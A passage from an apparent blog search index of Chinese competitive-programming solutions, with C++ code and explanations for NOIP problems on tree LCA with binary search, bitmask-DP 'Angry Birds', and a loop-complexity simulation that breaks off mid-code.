v-&gt;f[<span class="number">0</span>] = v-&gt;p = f;</span><br><span class="line">    v-&gt;d = (f ? f-&gt;d : <span class="number">0</span>) + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= LOG_MAXN; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (v-&gt;f[i - <span class="number">1</span>]) &#123;</span><br><span class="line">            v-&gt;f[i] = v-&gt;f[i - <span class="number">1</span>]-&gt;f[i - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (Edge *e = &amp;v-&gt;e.<span class="built_in">front</span>(); e &amp;&amp; e &lt;= &amp;v-&gt;e.<span class="built_in">back</span>(); e++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (e-&gt;t == f) <span class="keyword">continue</span>;</span><br><span class="line">        e-&gt;t-&gt;sum += e-&gt;w + e-&gt;s-&gt;sum;</span><br><span class="line">        e-&gt;t-&gt;in = e;</span><br><span class="line">        <span class="built_in">prepare</span>(e-&gt;t, v);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> Node *<span class="title">lca</span><span class="params">(Node *u, Node *v)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (u-&gt;d &lt; v-&gt;d) std::<span class="built_in">swap</span>(u, v);</span><br><span class="line">    <span class="keyword">if</span> (u-&gt;d != v-&gt;d) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = LOG_MAXN; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (u-&gt;f[i] &amp;&amp; u-&gt;f[i]-&gt;d &gt;= v-&gt;d) &#123;</span><br><span class="line">                u = u-&gt;f[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (u != v) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = LOG_MAXN; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (u-&gt;f[i] != v-&gt;f[i]) &#123;</span><br><span class="line">                u = u-&gt;f[i];</span><br><span class="line">                v = v-&gt;f[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> u-&gt;p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> u;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">int</span> <span class="title">dist</span><span class="params">(Node *u, Node *v, Node *p)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> u-&gt;sum + v-&gt;sum - <span class="number">2</span> * p-&gt;sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">calcSum</span><span class="params">(Node *v, Node *p = <span class="literal">NULL</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (Edge *e = &amp;v-&gt;e.<span class="built_in">front</span>(); e &amp;&amp; e &lt;= &amp;v-&gt;e.<span class="built_in">back</span>(); e++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (e-&gt;t == p) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="built_in">calcSum</span>(e-&gt;t, v);</span><br><span class="line">        v-&gt;mark += e-&gt;t-&gt;mark;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (v-&gt;in) v-&gt;in-&gt;mark += v-&gt;mark;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">check</span><span class="params">(<span class="type">int</span> limit)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) N[i].mark = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; i++) E[i]-&gt;mark = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (P[i].dist &gt; limit) &#123;</span><br><span class="line">            cnt++;</span><br><span class="line">            P[i].u-&gt;mark++;</span><br><span class="line">            P[i].v-&gt;mark++;</span><br><span class="line">            P[i].p-&gt;mark -= <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">calcSum</span>(&amp;N[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    Edge *maxEdge = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (E[i]-&gt;mark == cnt &amp;&amp; (!maxEdge || E[i]-&gt;w &gt; maxEdge-&gt;w)) &#123;</span><br><span class="line">            maxEdge = E[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> maxEdge &amp;&amp; maxDist - maxEdge-&gt;w &lt;= limit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line"></span><br><span class="line">    maxDist = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        <span class="type">int</span> a, b, t;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d&quot;</span>, &amp;a, &amp;b, &amp;t);</span><br><span class="line">        <span class="built_in">addEdge</span>(a, b, t);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">prepare</span>(&amp;N[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; i++) E[i] = N[i].in;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; i++) &#123;</span><br><span class="line">        <span class="type">int</span> u, v;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;u, &amp;v);</span><br><span class="line">        P[i].u = &amp;N[u], P[i].v = &amp;N[v];</span><br><span class="line">        P[i].p = <span class="built_in">lca</span>(P[i].u, P[i].v);</span><br><span class="line">        P[i].dist = <span class="built_in">dist</span>(P[i].u, P[i].v, P[i].p);</span><br><span class="line">        maxDist = std::<span class="built_in">max</span>(maxDist, P[i].dist);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> l = <span class="number">0</span>, r = maxDist;</span><br><span class="line">    <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">        <span class="type">int</span> mid = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">check</span>(mid)) r = mid;</span><br><span class="line">        <span class="keyword">else</span> l = mid + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, l);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>NOIP</tag>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>图论</tag>
        <tag>树</tag>
        <tag>二分</tag>
        <tag>最近公共祖先</tag>
        <tag>倍增</tag>
        <tag>二分答案</tag>
        <tag>树上差分</tag>
        <tag>2015</tag>
      </tags>
  </entry>
  <entry>
    <title>「NOIP2016」愤怒的小鸟 - 状压 DP</title>
    <url>/noip2016-angrybirds/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P2831">洛谷链接</a></p>
<p><a href="https://loj.ac/p/2363">LibreOJ 链接</a></p>
<p>Kiana 最近沉迷于一款神奇的游戏无法自拔。<br />
简单来说，这款游戏是在一个平面上进行的。有一架弹弓位于 <span
class="math inline">\((0, 0)\)</span> 处，每次 Kiana
可以用它向第一象限发射一只小鸟，小鸟们的飞行轨迹均为形如 <span
class="math inline">\(y = ax ^ 2 + bx\)</span> 的曲线，其中 <span
class="math inline">\(a\)</span>，<span class="math inline">\(b\)</span>
是 Kiana 指定的参数，且必须满足 <span class="math inline">\(a &lt;
0\)</span>。当小鸟落回地面（即 <span class="math inline">\(x\)</span>
轴）时，它就会瞬间消失。</p>
<p>在游戏的某个关卡里，平面的第一象限中有 <span
class="math inline">\(n\)</span> 只猪，其中第 <span
class="math inline">\(i\)</span> 只猪所在的坐标为 <span
class="math inline">\((x_i, y_i)\)</span>。如果某只小鸟的飞行轨迹经过了
<span class="math inline">\((x_i, y_i)\)</span>，那么第 <span
class="math inline">\(i\)</span>
只猪就会被消灭掉，同时小鸟将会沿着原先的轨迹继续飞行；如果一只小鸟的飞行轨迹没有经过
<span class="math inline">\((x_i,
y_i)\)</span>，那么这只小鸟飞行的全过程就不会对第 <span
class="math inline">\(i\)</span> 只猪产生任何影响。
例如，若两只猪分别位于 <span class="math inline">\((1, 3)\)</span> 和
<span class="math inline">\((3, 3)\)</span>，Kiana
可以选择发射一只飞行轨迹为 <span class="math inline">\(y = -x ^ 2 +
4x\)</span> 的小鸟，这样两只猪就会被这只小鸟一起消灭。<br />
而这个游戏的目的，就是通过发射小鸟消灭所有的猪。</p>
<p>假设这款游戏一共有 <span class="math inline">\(T\)</span>
个关卡，现在 Kiana
想知道，对于每一个关卡，至少需要发射多少只小鸟才能消灭所有的猪。由于她不会算，所以希望由你告诉她。</p>
<p>数据范围：<span class="math inline">\(1 \leq n \leq
18\)</span>，<span class="math inline">\(0 \leq m \leq 2\)</span>，<span
class="math inline">\(0 &lt; x_i, y_i &lt; 10\)</span>，<span
class="math inline">\(1 \leq T \leq 30\)</span>。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>很明显是状压
DP。先枚举每两个猪是否构成抛物线，以及抛物线后可达到另外的哪些猪。将抛物线可达到的猪的集合存为
<span class="math inline">\(g_i\)</span>，抛物线个数为 <span
class="math inline">\(\text{sizeG}\)</span>。</p>
<p>接下来我们定义 <span class="math inline">\(f_i\)</span> 为已清除
<span class="math inline">\(i\)</span>
集合的猪所需最少的鸟的数量。显然我们可推出下列状态转移方程：</p>
<p><span class="math display">\[
f_{i \cap g_j} = \min\{f_{i \cap g_j}, f_i + 1\} \quad i \in [1, n], j
\in [1, \text{sizeG}]
\]</span></p>
<p>初始化 <span class="math inline">\(f_i = +\infty\)</span>。答案 <span
class="math inline">\(f_S\)</span>，其中 <span
class="math inline">\(S\)</span> 为全集。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">20</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">double</span> EPS = <span class="number">1e-6</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">solve</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n, m;</span><br><span class="line">    <span class="type">static</span> <span class="type">double</span> x[MAXN], y[MAXN];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%lf %lf&quot;</span>, &amp;x[i], &amp;y[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> g[MAXN * MAXN];</span><br><span class="line">    <span class="built_in">memset</span>(g, <span class="number">0</span>, <span class="built_in">sizeof</span>(g));</span><br><span class="line">    <span class="type">int</span> sizeG = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = i + <span class="number">1</span>; j &lt; n; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">fabs</span>(x[j] - x[i]) &lt; EPS) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="type">double</span> a = (x[i] * y[j] - x[j] * y[i]) / (x[i] * x[j] * x[j] - x[i] * x[i] * x[j]);</span><br><span class="line">            <span class="type">double</span> b = (x[i] * x[i] * y[j] - x[j] * x[j] * y[i]) / (x[i] * x[i] * x[j] - x[i] * x[j] * x[j]);</span><br><span class="line">            <span class="keyword">if</span> (a &gt; -EPS) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; n; k++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">fabs</span>(a * x[k] * x[k] + b * x[k] - y[k]) &lt; EPS) &#123;</span><br><span class="line">                    g[sizeG] |= (<span class="number">1</span> &lt;&lt; k);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            sizeG++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> f[<span class="number">1</span> &lt;&lt; MAXN];</span><br><span class="line">    <span class="built_in">memset</span>(f, <span class="number">0x3f</span>, <span class="built_in">sizeof</span>(f));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) f[<span class="number">1</span> &lt;&lt; i] = <span class="number">1</span>;</span><br><span class="line">    f[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; (<span class="number">1</span> &lt;&lt; n); i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; sizeG; j++) &#123;</span><br><span class="line">            f[i | g[j]] = std::<span class="built_in">min</span>(f[i | g[j]], f[i] + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">            f[i | (<span class="number">1</span> &lt;&lt; j)] = std::<span class="built_in">min</span>(f[i | (<span class="number">1</span> &lt;&lt; j)], f[i] + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, f[(<span class="number">1</span> &lt;&lt; n) - <span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> t;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;t);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (t--) <span class="built_in">solve</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>NOIP</tag>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>DP</tag>
        <tag>状压 DP</tag>
        <tag>2016</tag>
      </tags>
  </entry>
  <entry>
    <title>「NOIP2017」时间复杂度 - 模拟</title>
    <url>/noip2017-complexity/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P3952">洛谷链接</a></p>
<p>本题定义了一个新语言名为 A++，语言的循环定义如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">F i x y</span><br><span class="line">    循环体</span><br><span class="line">E</span><br></pre></td></tr></table></figure>
<p>本循环相当于</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = x; i &lt;= y; i++)</span><br></pre></td></tr></table></figure>
<p>输入一个程序和时间复杂度，判断时间复杂度是否和程序相符。 其中满足
x，y 必为常数或 n，n 远大于 x，y。</p>
<p>具体信息可详见洛谷，链接见上</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>显然本题为一道模拟题。</p>
<h2 id="模型建立">模型建立</h2>
<p>解题思路为通过 A++ 循环分析该代码的时间复杂度。 时间复杂度可通过存储
<span class="math inline">\(O(n^k)\)</span> 的指数达到目的。 通过新建
<code>depth</code> 变量存储有效增加代码时间复杂度的个数，使用
<code>maxn</code> 变量存储 <code>depth</code> 的最大值即可记录该 A++
代码的时间复杂度。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">std::cin &gt;&gt; l &gt;&gt; tmp;</span><br><span class="line"><span class="keyword">if</span> (tmp[<span class="number">2</span>] == <span class="string">&#x27;1&#x27;</span>) o = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    o = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> each = <span class="number">4</span>; tmp[each] &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; tmp[each] &lt;= <span class="string">&#x27;9&#x27;</span>; each++) &#123;</span><br><span class="line">        o = o * <span class="number">10</span> + tmp[each] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>本题由于有嵌套循环的可能，所以可以写一个栈来模拟。 又由于 A++
中变量不可重名，故有遍历栈的需求。 故可以写一个手工栈，栈中存有 A++
变量名。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> top = <span class="number">0</span>;</span><br><span class="line">std::string stack[<span class="number">100</span>];</span><br></pre></td></tr></table></figure>
<p>此时输入 F 则入栈，输入 E 则出栈，注意当 F 与 E
没有一一对应时需要处理为 ERR。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">std::cin &gt;&gt; tmp;</span><br><span class="line"><span class="keyword">if</span> (tmp == <span class="string">&quot;F&quot;</span>) &#123;</span><br><span class="line">    std::cin &gt;&gt; stack[top] &gt;&gt; x &gt;&gt; y;</span><br><span class="line">    <span class="comment">// 处理后续</span></span><br><span class="line">    top++;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (top == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// A++语法错误，输出ERR及处理后续</span></span><br><span class="line">    &#125; <span class="keyword">else</span> top--;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="循环处理">循环处理</h2>
<p>首先处理 A++ 循环中申明的变量，若变量重复，则处理为 ERR。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; top; j++)</span><br><span class="line">    <span class="keyword">if</span>(stack[j] == stack[top])</span><br><span class="line">        err = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure>
<p>循环可分 4 种情况讨论：</p>
<ol type="1">
<li>x，y 均为 n；</li>
<li>x 为 n，y 为常数；</li>
<li>x 为常数，y 为 n；</li>
<li>x，y 均为常数。</li>
</ol>
<p>第一种情况显然时间复杂度为 <span
class="math inline">\(O(1)\)</span>。 第二种情况由于 n 远大于
x，故这个循环和循环内部的任何语句都不会被执行，此时需要新建变量
<code>unknown</code> 来记录该层层数，在这个层数之上则不记录时间复杂度。
第三种情况由于 n 远大于 y，时间复杂度为 <span
class="math inline">\(O(n)\)</span>，所以需要 <code>depth++</code>。
第四种情况则需要分两种情况讨论。</p>
<ol type="1">
<li><span class="math inline">\(x \leq y\)</span></li>
<li><span class="math inline">\(x &gt; y\)</span>
其中第一种情况显然时间复杂度为 <span
class="math inline">\(O(1)\)</span>。
第二种情况得循环及其内部也不会被执行，等同 x 为 n，y 为常数的情况。</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (x == <span class="string">&quot;n&quot;</span> &amp;&amp; y == <span class="string">&quot;n&quot;</span>) f[top] = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span> (x == <span class="string">&quot;n&quot;</span> &amp;&amp; y != <span class="string">&quot;n&quot;</span>) &#123;</span><br><span class="line">    f[top] = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (top &lt; unshown)</span><br><span class="line">        unshown = top;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (x != <span class="string">&quot;n&quot;</span> &amp;&amp; y == <span class="string">&quot;n&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (top &lt; unshown) &#123;</span><br><span class="line">        f[top] = <span class="literal">true</span>;</span><br><span class="line">        depth++;</span><br><span class="line">    &#125; <span class="keyword">else</span> f[top] = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (x != <span class="string">&quot;n&quot;</span> &amp;&amp; y != <span class="string">&quot;n&quot;</span>) &#123;</span><br><span class="line">    nx = ny = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; x.<span class="built_in">length</span>(); j++) nx = nx * <span class="number">10</span> + x[j] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; y.<span class="built_in">length</span>(); j++) ny = ny * <span class="number">10</span> + y[j] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (nx &gt; ny &amp;&amp; top &lt; unshown) unshown = top;</span><br><span class="line">    f[top] = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">top++;</span><br><span class="line"><span class="keyword">if</span> (depth &gt; maxn) maxn = depth;</span><br></pre></td></tr></table></figure>
<p>最后在收到 E 的时候结束循环，弹出栈。 若栈已空，则说明 F 与 E
不匹配，处理为 ERR。 此时则需检测这层循环中 <code>depth</code>
有无变化，若有变化则 <code>depth--</code>
表明这层循环已退出时间复杂度的统计，以便处理其他循环。 同时需注意处理
<code>unknown</code> 变量。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (top == <span class="number">0</span>) err = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (top - <span class="number">1</span> == unshown) unshown = <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (f[top - <span class="number">1</span>]) depth--;</span><br><span class="line">    top--;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> t, l, o, nx, ny, unshown;</span><br><span class="line">    std::string tmp, stack[<span class="number">100</span>], x, y;</span><br><span class="line">    <span class="type">int</span> depth, top, maxn;</span><br><span class="line">    <span class="type">bool</span> err, f[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">memset</span>(f, <span class="number">0</span>, <span class="built_in">sizeof</span>(f));</span><br><span class="line"></span><br><span class="line">    std::cin &gt;&gt; t;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (t &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        top = depth = maxn = <span class="number">0</span>;</span><br><span class="line">        unshown = <span class="number">100</span>;</span><br><span class="line">        err = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        std::cin &gt;&gt; l &gt;&gt; tmp;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (tmp[<span class="number">2</span>] == <span class="string">&#x27;1&#x27;</span>) o = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            o = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> each = <span class="number">4</span>; tmp[each] &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; tmp[each] &lt;= <span class="string">&#x27;9&#x27;</span>; each++) &#123;</span><br><span class="line">                o = o * <span class="number">10</span> + tmp[each] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> each = <span class="number">0</span>; each &lt; l; each++) &#123;</span><br><span class="line">            std::cin &gt;&gt; tmp;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (tmp == <span class="string">&quot;F&quot;</span>) &#123;</span><br><span class="line">                std::cin &gt;&gt; stack[top] &gt;&gt; x &gt;&gt; y;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; top; j++)</span><br><span class="line">                    <span class="keyword">if</span> (stack[j] == stack[top])</span><br><span class="line">                        err = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (x == <span class="string">&quot;n&quot;</span> &amp;&amp; y == <span class="string">&quot;n&quot;</span>) f[top] = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (x == <span class="string">&quot;n&quot;</span> &amp;&amp; y != <span class="string">&quot;n&quot;</span>) &#123;</span><br><span class="line">                    f[top] = <span class="literal">false</span>;</span><br><span class="line">                    <span class="keyword">if</span> (top &lt; unshown) unshown = top;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (x != <span class="string">&quot;n&quot;</span> &amp;&amp; y == <span class="string">&quot;n&quot;</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (top &lt; unshown) &#123;</span><br><span class="line">                        f[top] = <span class="literal">true</span>;</span><br><span class="line">                        depth++;</span><br><span class="line">                    &#125; <span class="keyword">else</span> f[top] = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (x != <span class="string">&quot;n&quot;</span> &amp;&amp; y != <span class="string">&quot;n&quot;</span>) &#123;</span><br><span class="line">                    nx = ny = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; x.<span class="built_in">length</span>(); j++) nx = nx * <span class="number">10</span> + x[j] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; y.<span class="built_in">length</span>(); j++) ny = ny * <span class="number">10</span> + y[j] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">                    <span class="keyword">if</span> (nx &gt; ny &amp;&amp; top &lt; unshown) unshown = top;</span><br><span class="line"></span><br><span class="line">                    f[top] = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                top++;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (depth &gt; maxn) maxn = depth;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (top == <span class="number">0</span>) err = <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (top - <span class="number">1</span> == unshown)</span><br><span class="line">                        unshown = <span class="number">100</span>;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span> (f[top - <span class="number">1</span>])</span><br><span class="line">                        depth--;</span><br><span class="line"></span><br><span class="line">                    top--;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span 